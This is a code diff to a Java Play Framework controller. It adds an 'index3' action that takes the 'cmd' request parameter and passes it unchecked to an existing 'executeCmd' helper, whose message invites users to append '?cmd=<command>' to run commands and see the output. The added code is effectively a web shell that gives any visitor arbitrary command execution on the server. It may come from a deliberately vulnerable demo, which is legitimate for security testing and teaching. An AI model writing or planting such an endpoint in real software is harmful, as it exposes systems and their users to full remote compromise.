@@ -25,6 +25,13 @@ public class Application extends Controller {
         render();
     }
 
+    public static void index3() throws IOException {
+        String command = Scope.Params.current().get("cmd");
+        String result = executeCmd(command);
+        renderArgs.put("result", result);
+        render();
+    }
+
     private static String executeCmd(String command) throws IOException {
         if (command == null) {
             return "no cmd specified. Add '?cmd=<command>' to execute and see result";
